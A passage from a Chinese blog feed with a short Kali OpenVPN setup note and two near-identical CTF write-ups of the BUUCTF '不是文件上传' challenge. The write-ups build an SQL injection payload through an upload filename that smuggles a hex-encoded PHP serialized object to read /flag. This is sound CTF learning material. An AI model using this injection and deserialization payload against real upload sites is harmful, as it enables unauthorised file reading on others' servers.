        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>被csdn卡了，emmm想了想应该是openvpn的问题，特此记录到博客里面，ps本人遵纪守法热爱祖国。</p><h3 id="配置kali游戏环境"><a href="#配置kali游戏环境" class="headerlink" title="配置kali游戏环境"></a>配置kali游戏环境</h3><p>首先要在kali里面安装一个openvpn的工具，根据大哥的教程有下面的配置步骤<br>openvpn配置<br>在kali下安装这几个源</p><pre class="line-numbers language-none"><code class="language-none">apt-get install network-manager-openvpnapt-get install network-manager-openvpn-gnomeapt-get install network-manager-pptpapt-get install network-manager-pptp-gnomeapt-get install network-manager-strongswanapt-get install network-manager-vpncapt-get install network-manager-vpnc-gnome<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在access页面点击here下载openvpn配置文件<br><a href="https://www.hackthebox.eu/home/htb/access/ovpnfile">https://www.hackthebox.eu/home/htb/access/ovpnfile</a><br>使用命令：xxxx.ovpn是下载好的配置文件,这里要用root权限运行。<br>sudo oepnvpn —config xxxx.ovpn<br>连接成功后会在access页面看到connected打勾：<br><img src="https://img-blog.csdnimg.cn/20210316143646812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5neGlhbnNoZW5nMTI=,size_16,color_FFFFFF,t_70" alt="HTB安装openvpn并连接成功"></p><p>就像这样，特别炫酷啊有没有，machine我没搞出来，wtcl，做个misc吧，这个题库还是太复杂了(主要是英语我看不懂tmd)。</p>]]></content>
      
      
      
        <tags>
            
            <tag> openvpn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu_web刷题</title>
      <link href="2021/03/10/buu-web%E5%88%B7%E9%A2%98/"/>
      <url>2021/03/10/buu-web%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>因为一个一个发太麻烦了，这里我就做几个后的wp做成一篇博客了。</p><h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>什么信息泄露？在哪里可以看到信息泄露？我都扫出东方明珠塔了还没发现信息泄露呜呜，原来信息就在主页的下，小丑竟是我自己。。。<code>Powered By wowouploadimage © 20014-2019, All right reserved.</code>，这里的<code>wowouploadimage</code>是一套模板，先要搞一套源码，然后再分析。<br><a href="https://github.com/Threezh1/wowouploadimage">wowouploadimage源码下载</a><br>这里面的重要利用点是下面的几句代码<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'title'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'filename'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ext'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'path'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">folder</span><span class="token punctuation">.</span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>$title就是没有后缀名的文件名，并且很明显没有做任何过滤。再看对数据库的操作。<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql_fields</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$key_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$value_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql_fields</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"`"</span><span class="token punctuation">.</span><span class="token variable">$key_temp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"`"</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"'"</span><span class="token punctuation">.</span><span class="token variable">$value_temp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"INSERT INTO images ("</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">") VALUES("</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">")"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>上面的foreach好像是将<code>\0\0\0</code>替换为了<code>chr(0)*chr(0)</code>，而后面的代替又将<code>attr</code>中的<code>chr(0)*chr(0)</code>变成了<code>\0\0\0</code>，正常的sql语句是<br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> images <span class="token punctuation">(</span><span class="token punctuation">`</span>title<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>filename<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>ext<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>path<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>attr<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'TIM截图20191102114857'</span><span class="token punctuation">,</span><span class="token string">'f20c76cc4fb41838.jpg'</span><span class="token punctuation">,</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'pic/f20c76cc4fb41838.jpg'</span><span class="token punctuation">,</span><span class="token string">'a:2:&#123;s:5:"width";i:1264;s:6:"height";i:992;&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>由于title可由我们控制，没有处理，可以直接换成<code>1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)#.jpg</code>，后面的反序列化后的内容就可由我们进行改变了，触发的时候，由于销毁前执行析构函数，从而有调用到<code>view_files()函数</code>执行危险函数<code>file_get_contents();</code>，故php的序列化内容应为<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token boolean constant">TRUE</span><span class="token punctuation">;</span> <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># O:6:"helper":2:&#123;s:9:"*ifview";b:1;s:9:"*config";s:5:"/flag";&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>然后就是这里的protected变量的<code>*</code>被替换掉了的问题，就把<code>*</code>变成<code>\0\0\0</code>就行了，就是<br><pre class="line-numbers language-none"><code class="language-none">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;&#39;)#.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>试试先，bp抓包改filename，emmm双引号会被提前截断，可换成单引号<br><pre class="line-numbers language-none"><code class="language-none">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;&#39;)#.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>显示something wrong，显然是因为我们的格式不对从而触发了该点<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>只有将后面的序列化内容转为hex了<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'O:6:"helper":2:&#123;s:9:"\0\0\0ifview";b:1;s:9:"\0\0\0config";s:5:"/flag";&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">4</span>f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>用下面的payload即可<br><pre class="line-numbers language-none"><code class="language-none">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><code>flag&#123;8894c4be-81c8-4b1f-bf86-e1a1d21f73f6&#125;</code></p><h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>开局给了个提示<br><pre class="line-numbers language-none"><code class="language-none">友情提示如果您还不是会员，请注册用户名只支持大写请使用ADMIN登录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>然后根据题目了解到Express框架是基于Nodejs的，就这么多提示了。有源码泄露，在登陆之后的主页里的源码注释里面也有提示源码泄露好像<code>/www.zip</code>。<br>然后就是javascript的原型链污染了，感觉还行，就是调用属性方法之类的时候如果没在本类中发现就会自动向上搜索，直到最顶部的null。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> web刷题 </tag>
            
            <tag> buu </tag>
            
            <tag> 信息泄露 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯 2019-不是文件上传</title>
      <link href="2021/03/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>2021/03/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>什么信息泄露？在哪里可以看到信息泄露？我都扫出东方明珠塔了还没发现信息泄露呜呜，原来信息就在主页的下，小丑竟是我自己。。。<code>Powered By wowouploadimage © 20014-2019, All right reserved.</code>，这里的<code>wowouploadimage</code>是一套模板，先要搞一套源码，然后再分析。<br><a href="https://github.com/Threezh1/wowouploadimage">wowouploadimage源码下载</a><br>这里面的重要利用点是下面的几句代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'title'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'filename'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ext'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'path'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">folder</span><span class="token punctuation">.</span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$title就是没有后缀名的文件名，并且很明显没有做任何过滤。再看对数据库的操作。<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql_fields</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$key_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$value_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql_fields</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"`"</span><span class="token punctuation">.</span><span class="token variable">$key_temp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"`"</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"'"</span><span class="token punctuation">.</span><span class="token variable">$value_temp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"INSERT INTO images ("</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">") VALUES("</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">")"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>上面的foreach好像是将<code>\0\0\0</code>替换为了<code>chr(0)*chr(0)</code>，而后面的代替又将<code>attr</code>中的<code>chr(0)*chr(0)</code>变成了<code>\0\0\0</code>，正常的sql语句是<br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> images <span class="token punctuation">(</span><span class="token punctuation">`</span>title<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>filename<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>ext<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>path<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>attr<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'TIM截图20191102114857'</span><span class="token punctuation">,</span><span class="token string">'f20c76cc4fb41838.jpg'</span><span class="token punctuation">,</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'pic/f20c76cc4fb41838.jpg'</span><span class="token punctuation">,</span><span class="token string">'a:2:&#123;s:5:"width";i:1264;s:6:"height";i:992;&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>由于title可由我们控制，没有处理，可以直接换成<code>1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)#.jpg</code>，后面的反序列化后的内容就可由我们进行改变了，触发的时候，由于销毁前执行析构函数，从而有调用到<code>view_files()函数</code>执行危险函数<code>file_get_contents();</code>，故php的序列化内容应为<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token boolean constant">TRUE</span><span class="token punctuation">;</span> <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># O:6:"helper":2:&#123;s:9:"*ifview";b:1;s:9:"*config";s:5:"/flag";&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>然后就是这里的protected变量的<code>*</code>被替换掉了的问题，就把<code>*</code>变成<code>\0\0\0</code>就行了，就是<br><pre class="line-numbers language-none"><code class="language-none">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;&#39;)#.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>试试先，bp抓包改filename，emmm双引号会被提前截断，可换成单引号<br><pre class="line-numbers language-none"><code class="language-none">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;&#39;)#.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>显示something wrong，显然是因为我们的格式不对从而触发了该点<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>只有将后面的序列化内容转为hex了<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'O:6:"helper":2:&#123;s:9:"\0\0\0ifview";b:1;s:9:"\0\0\0config";s:5:"/flag";&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">4</span>f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>用下面的payload即可<br><pre class="line-numbers language-none"><code class="language-none">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><code>flag&#123;8894c4be-81c8-4b1f-bf86-e1a1d21f73f6&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> buu </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2018_Unfinish</title>
      <link href="2021/03/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/"/>
      <url>2021/03/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/</url>
      
